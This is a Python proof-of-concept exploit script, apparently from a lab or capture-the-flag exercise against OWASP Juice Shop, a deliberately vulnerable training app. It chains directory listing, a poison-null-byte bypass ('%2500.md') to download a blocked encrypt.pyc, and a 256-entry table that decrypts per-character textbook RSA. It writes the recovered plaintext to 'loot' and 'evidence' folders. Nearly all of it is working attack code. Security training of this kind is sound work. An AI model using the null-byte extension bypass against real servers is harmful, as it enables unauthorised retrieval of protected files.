#!/usr/bin/env python3
"""
C10 - End-to-end PoC: obtain + decrypt OWASP Juice Shop /ftp/announcement_encrypted.md

CHAIN
  0. /ftp/ has directory listing enabled                 -> RECON / info disclosure
  1. GET /ftp/encrypt.pyc is blocked with
     "Only .md and .pdf files are allowed!" (403)
     Bypass: /ftp/encrypt.pyc%2500.md   (%2500 -> "%00" after one URL decode,
     the null byte poisons the extension check but Node truncates at \0 for
     the file read)                                     -> Poison Null Byte
  2. encrypt.pyc contains:
         N = 145906768003...053   (1024-bit)
         e = 65537
         for char in open('announcement.md'):
             out.write(str(pow(ord(char), e, N)) + "\n")
     i.e. TEXTBOOK RSA APPLIED PER CHARACTER - no padding, and the plaintext
     alphabet is only 0..255. Therefore the "encryption" is a substitution
     cipher over at most 256 symbols: invert it by brute force.
     NO FACTORING OF N IS NEEDED.
  3. Build table b -> pow(b,e,N) for b in 0..255, invert, decrypt all 1194
     blocks, then verify by re-encryption (strict byte-for-byte compare).

Usage: python3 c10_full_chain.py [base_url]
"""
import sys, os, re, hashlib, subprocess, urllib.request

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://host.docker.internal:3000"
LOOT = "/workspace/loot"
EVID = "/workspace/evidence"
CT_URL   = BASE + "/ftp/announcement_encrypted.md"
PYC_URL  = BASE + "/ftp/encrypt.pyc%2500.md"   # poison-null-byte bypass
os.makedirs(LOOT, exist_ok=True); os.makedirs(EVID, exist_ok=True)


def get(url):
    with urllib.request.urlopen(url, timeout=60) as r:
        return r.status, r.read()

print("[1] fetching ciphertext: %s" % CT_URL)
st, ct_raw = get(CT_URL)
print("    HTTP %d, %d bytes" % (st, len(ct_raw)))
open(os.path.join(LOOT, "announcement_encrypted.md"), "wb").write(ct_raw)

print("[2] fetching encrypt.pyc via null-byte bypass: %s" % PYC_URL)
st, pyc = get(PYC_URL)
print("    HTTP %d, %d bytes, py2.7 magic=%s" % (st, len(pyc), pyc[:4].hex()))
assert st == 200 and pyc[:4] == b"\x03\xf3\x0d\x0a", "did not get a Python 2.7 pyc"
open(os.path.join(LOOT, "encrypt.real.pyc"), "wb").write(pyc)

# extract N and e from the pyc constants using xdis' disassembler
try:
    dis = subprocess.run(["pydisasm", os.path.join(LOOT, "encrypt.real.pyc")],
                         capture_output=True, text=True, timeout=120).stdout
    cand = [int(x.rstrip("L")) for x in re.findall(r"#\s+\d+: (\d{100,})L", dis)]
    assert cand and 65537 in [int(x) for x in re.findall(r"#\s+\d+: (\d+)\s*$", dis, re.M)]
    N = cand[0]; E = 65537
    print("    extracted N (%d bits) and e=%d from encrypt.pyc" % (N.bit_length(), E))
except (FileNotFoundError, AssertionError, IndexError) as ex:
    N = 145906768007583323230186939349070635292401872375357164399581871019873438799005358938369571402670149802121818086292467422828157022922076746906543401224889672472407926969987100581290103199317858753663710862357656510507883714297115637342788911463535102712032765166518411726859837988672111837205085526346618740053
    E = 65537
    print("    [!] pydisasm unavailable (%s); using known constant, N=%d bits" % (ex, N.bit_length()))

print("[3] building 256-entry inversion table pow(b,e,N)->b")
table = {}
for b in range(256):
    table[pow(b, E, N)] = b
assert len(table) == 256

print("[4] decrypting")
cts = [int(x) for x in ct_raw.split()]
plain = bytearray()
for i, c in enumerate(cts):
    b = table.get(c)
    if b is None:
        sys.exit("[!] block %d not in 0..255 alphabet -> wrong modulus" % i)
    plain.append(b)
print("    %d blocks -> %d plaintext bytes" % (len(cts), len(plain)))

print("[5] verifying by re-encryption")
ok = "".join("%d\n" % pow(b, E, N) for b in plain) == ct_raw.decode()
print("    byte-for-byte match: %s" % ok)
print("    sha256(plaintext) = %s" % hashlib.sha256(bytes(plain)).hexdigest())
assert ok, "verification failed"

text = bytes(plain).decode()
open(os.path.join(LOOT, "c10_recovered.md"), "w").write(text)

last_line = [l for l in text.splitlines() if l.strip()][-1]
print("[6] plaintext final line: %r" % last_line)
open(os.path.join(EVID, "c10_plaintext.txt"), "w").write(last_line + "\n")
open(os.path.join(EVID, "c10_announcement_plaintext.md"), "w").write(text)
print("[+] evidence written:")
print("      %s/evidence/c10_plaintext.txt        (final line)" % os.path.dirname(EVID))
print("      %s/evidence/c10_announcement_plaintext.md (full plaintext)" % os.path.dirname(EVID))
